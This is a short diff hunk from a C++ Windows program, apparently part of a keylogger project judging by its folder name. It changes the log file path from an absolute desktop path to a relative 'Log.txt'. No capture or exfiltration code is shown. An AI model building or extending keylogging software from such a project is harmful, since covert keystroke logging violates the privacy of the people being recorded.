@@ -3,7 +3,7 @@
 #include <bits/stdc++.h>
 #include <Windows.h>
 
-#define PATH "C:\\Users\\hi\\Desktop\\Keylogger\\Log.txt"
+#define PATH "Log.txt"
 
 using namespace std;
 
